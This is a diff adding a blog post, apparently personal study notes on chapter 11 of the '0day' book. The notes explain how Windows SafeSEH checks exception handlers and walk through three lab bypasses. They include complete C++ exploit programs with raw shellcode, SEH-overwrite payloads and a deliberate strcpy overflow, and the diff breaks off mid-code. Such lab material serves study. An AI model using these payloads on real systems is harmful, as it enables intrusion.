@@ -258,6 +258,246 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/17/safeSEH/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/17/safeSEH/" itemprop="url">攻破safeSEH</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-17T09:39:54+08:00">
+                2020-04-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="notes-about-0day-chapter-11"><a href="#notes-about-0day-chapter-11" class="headerlink" title="notes about 0day chapter 11"></a>notes about 0day chapter 11</h1><h2 id="from-11-1"><a href="#from-11-1" class="headerlink" title="from 11.1"></a>from 11.1</h2><p>简单回顾（SEH结构体）：  </p>
+<table>
+<thead>
+<tr>
+<th>Dword:Next SEH Header（低地址）</th>
+<th>SEH链表指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Dword:Exception Handler（高地址）</td>
+<td>异常处理函数句柄</td>
+</tr>
+</tbody></table>
+<p>safeSEH机制的几个校验：</p>
+<ol>
+<li>检查异常处理链（SEH链表指针）在当前程序栈中，若不在则终止异常处理函数得调用。</li>
+<li>检查异常处理函数句柄是否在当前栈中，若在则终止。</li>
+<li>在前面两项检查都通过后，程序调用一个全新的函数RtlIsValidHandler()，来对异常处理函数的有效性进行验证。</li>
+</ol>
+<p>RtlIsValidHandler的一些验证：  </p>
+<ol>
+<li>检查程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH 标识。如果设置了这个标识，这个程序内的异常会被忽略。所以当这个标志被设置时，函数直接返回校验失败。</li>
+<li>检测程序是否包含安全S.E.H 表。如果程序包含安全S.E.H 表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。</li>
+<li>判断程序是否设置ILonly 标识。如果设置了这个标识，说明该程序只包含.NET编译人中间语言，函数直接返回校验失败。</li>
+<li>判断异常处理函数地址是否位于不可执行页（non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP 是否开启，如果系统未开启DEP 则返回校验成功，否则程序抛出访问违例的异常。</li>
+</ol>
+<p>若SEH句柄地址不在加载模块的内存空间上，会进行如下的判断：</p>
+<ol>
+<li>判断异常处理函数地址是否位于不可执行页（non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP 是否开启，如果系统未开启DEP 则返回校验成功，否则程序抛出访问违例的异常。</li>
+<li>判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。</li>
+</ol>
+<p><img src="/2020/04/17/safeSEH/safeSEH1.JPG" alt></p>
+<p>相关伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RtlIsValidHandler</span><span class="params">(handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (handler is in an <span class="built_in">image</span>) &#123; <span class="comment">//在加载模块内存空间内</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> has a SafeSEH table) <span class="comment">//含有安全S.E.H 表，说明程序启用SafeSEH</span></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)<span class="comment">//异常处理函数地址出现在安全S.E.H 表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span> <span class="comment">//异常处理函数未出现在安全S.E.H 表中</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> is a .NET assembly with the ILonly flag <span class="built_in">set</span>) <span class="comment">//只包含IL</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) &#123; <span class="comment">//跑到不可执行页上了</span></span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable <span class="built_in">bit</span> <span class="built_in">set</span> in the <span class="built_in">process</span> flags) <span class="comment">//DEP 关闭</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION; <span class="comment">//抛出访问违例异常</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is <span class="keyword">not</span> in an <span class="built_in">image</span>) &#123; <span class="comment">//在加载模块内存之外，并且在可执行页上</span></span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable <span class="built_in">bit</span> <span class="built_in">set</span> in the <span class="built_in">process</span> flags)</span><br><span class="line">        <span class="comment">//允许在加载模块内存空间外执行</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE; <span class="comment">//前面条件都不满足的话只能允许这个异常处理函数执行了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据伪代码可以清晰整理出使得返回值为1的方法：</p>
+<ol>
+<li>在加载模块内没有SEH表。</li>
+<li>在加载模块内且在SEH表中。</li>
+<li>在不可执行的分页且DEP关闭。</li>
+<li>在加载模块之外且DEP关闭。</li>
+</ol>
+<p>其中可以使得shellcode可能执行的为1，2，4，具体方法：</p>
+<ol>
+<li>针对上的4，排除DEP 干扰后，我们只需在加载模块内存范围之外找到一个跳板指令就可以转入shellcode 执行，<br>这点还是比较容易实现的。</li>
+<li>针对上的2，我们可以利用未启用SafeSEH 模块中的指令作为跳板，转入shellcode<br>执行，这也是为什么我们说SafeSEH 需要操作系统与编译器的双重支持。在加载模块中找到一个未启用的SafeSEH 模块也不是一件很困难的事情。</li>
+<li>针对上的1，一是清空安全S.E.H 表，造成该模块未启用SafeSEH 的假象；二是将我们的指令注册到安全S.E.H 表中。由于安全S.E.H 表的信息在内存中是加密存放的，所以突破它的可能性也不大，这条路我们就先放弃吧。</li>
+</ol>
+<p>书中还阐述了比较简单的攻击方法：</p>
+<ol>
+<li>不攻击SEH，可以考虑覆盖返回地址或者虚函数表等信息。</li>
+<li>利用S.E.H 的终极特权！这种安全校验存在一个严重的缺陷——如果S.E.H 中的异常函数指针指向堆区，即使安全校验发现了S.E.H 已经不可信，仍然会调用其已被修改过的异常<br>处理函数，因此只要将shellcode 布置到堆区就可以直接跳转执行！</li>
+</ol>
+<p>即将shellcode布置到堆区中（当然DEP关闭）。</p>
+<h2 id="from-11-4"><a href="#from-11-4" class="headerlink" title="from 11.4"></a>from 11.4</h2><p>实验要点：</p>
+<p>当strcpy时产生溢出，当test时出现异常，异常调用的SEH中的异常函数指针指向堆区，故可以绕过safeSEH。</p>
+<p>shellcode在堆中的位置：0x00392A60</p>
+<p>shellcode在栈中的起始位置：0x0012FDB4</p>
+<p>test栈中的SEH处理指针：0x0012FFAC-&gt;0x00411078</p>
+<p>所以shellcode：504(shellcode+patch)+addr(0x00392A60)</p>
+<p>使用书中的弹窗shellcode，得到的整个代码：  </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span></span><br><span class="line"><span class="comment">//patch</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x60\x2A\x39\x00"</span></span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> * input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(str,input);</span><br><span class="line">	<span class="comment">//__asm int 3;</span></span><br><span class="line">	<span class="keyword">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * buf=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="built_in">strcpy</span>(buf,shellcode);</span><br><span class="line">	test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>验证结果：</p>
+<p><img src="/2020/04/17/safeSEH/success1.JPG" alt></p>
+<h2 id="from-11-5"><a href="#from-11-5" class="headerlink" title="from 11.5"></a>from 11.5</h2><h3 id="利用未启用SafeSEH模块绕过SafeSEH"><a href="#利用未启用SafeSEH模块绕过SafeSEH" class="headerlink" title="利用未启用SafeSEH模块绕过SafeSEH"></a>利用未启用SafeSEH模块绕过SafeSEH</h3><p>这里布置了一个没开启safeSEH的模块进行测试：</p>
+<p><img src="/2020/04/17/safeSEH/safeSEH2.JPG" alt></p>
+<p>使用的pop pop ret指令地址：</p>
+<p>111211B6        pop ecx<br>                pop ecx<br>                retn</p>
+<p>所以将SEH handle的地址覆盖为0x111211B6即可。</p>
+<p>SEH指针地址：0x0012FE94</p>
+<p>参数的开始地址：0x0012FDB8</p>
+<p>所以需要220的patch。</p>
+<p>所以payload=patch(“0x90”*220)+(0x111211B6)+(“0x90”8)+shellcode</p>
+<p>测试代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH.EXE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xB6\x11\x12\x11"</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span></span><br><span class="line">;</span><br><span class="line"><span class="function">DWORD <span class="title">MyException</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"There is an exception"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> * input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(str,input);</span><br><span class="line">	<span class="keyword">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		zero=<span class="number">1</span>/zero;</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyException())</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE hInst = LoadLibrary(_T(<span class="string">"SEH_NOSafeSEH_JUMP.dll"</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	test(shellcode);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在0x111211B6设置断点，在程序将参数拷贝完成后f9，可以看到程序直接跳转到布置的（pop pop retn）处：</p>
+<p><img src="/2020/04/17/safeSEH/success2.JPG" alt></p>
+<p>此时就因为地址指向的是未开启safeSEH的地方，所以可以进行跳转。<br>f9继续运行即可看到shellcode执行成功：</p>
+<p><img src="/2020/04/17/safeSEH/success3.JPG" alt></p>
+<h2 id="from-11-6"><a href="#from-11-6" class="headerlink" title="from 11.6"></a>from 11.6</h2><h3 id="利用加载模块之外的地址绕过SafeSEH"><a href="#利用加载模块之外的地址绕过SafeSEH" class="headerlink" title="利用加载模块之外的地址绕过SafeSEH"></a>利用加载模块之外的地址绕过SafeSEH</h3><p>当seh指针指向的是模块之外的映射空间时，不会进行校验安全性。在这种映射文件中找到跳板指令即可。</p>
+<p>找一条这样的跳转指令：</p>
+<p><img src="/2020/04/17/safeSEH/safeSEH3.JPG" alt></p>
+<p>跳板指令地址：0x00280B0B</p>
+<p>这里因为有\x00作为截断，所以不能将shellcode布置到该地址后面。书中介绍了一个跳转的方法，可是调试以后发现这个方法也是建立在一个巧合之上的：ebp+0x30 处存放的是 next SEH struct，即SEH handle的上面四个字节。</p>
+<p>使用两个字节的短跳转指令（EB 一个字节偏移）跳转到5个字节的长跳转指令处（E9 四个字节偏移），栈中的布置：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E9 (四个字节的偏移到shellcode开始处) 90 90(这里一共八个字节)</span><br><span class="line">EB F6 90 90(跳转到上一句)</span><br></pre></td></tr></table></figure>
+
+<p>SEH handle addr：0x0012FF64</p>
+<p>存放长长地址跳转的地址：0x0012FF60</p>
+<p>参数起始地址：0x0012FE88</p>
+<p>所以整个shellcode：</p>
+<p>(168 bytes shellcode)+(40 bytes nop)+(8 bytes “\xE9\x2B\xFF\xFF\xFF\x90\x90\x90”)+(4 bytes “\xB\xF6\x90\x90”)+跳板指令</p>
+<p>最后到的代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=                   </span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span>      </span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span>      </span><br><span class="line"><span class="string">"\xE9\x2B\xFF\xFF\xFF\x90\x90\x90"</span>      </span><br><span class="line"><span class="string">"\xEB\xF6\x90\x90"</span>                      </span><br><span class="line"><span class="string">"\x0B\x0B\x28\x00"</span>                    </span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function">DWORD <span class="title">MyException</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"There is an exception"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> * input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(str,input);</span><br><span class="line">	<span class="keyword">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		zero=<span class="number">1</span>/zero;</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyException())</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//__asm int 